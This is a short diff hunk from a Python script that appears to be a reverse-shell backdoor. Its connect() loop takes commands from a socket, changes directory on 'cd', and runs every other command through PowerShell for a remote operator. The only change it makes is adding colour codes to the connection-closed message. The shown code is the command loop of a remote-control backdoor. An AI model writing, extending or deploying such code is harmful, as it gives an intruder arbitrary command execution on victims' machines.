@@ -23,7 +23,7 @@ def connect():
         if command.split(" ")[0] == "cd":
             os.chdir(command.split(" ")[1])
         elif command == 'close':
-            client.send(b"[*] Connection closed !!!")
+            client.send(b"\033[32m[*] Connection closed !!!\033[0m\n")
             break
         stdout = subprocess.check_output(["powershell", "-Command",command])
 
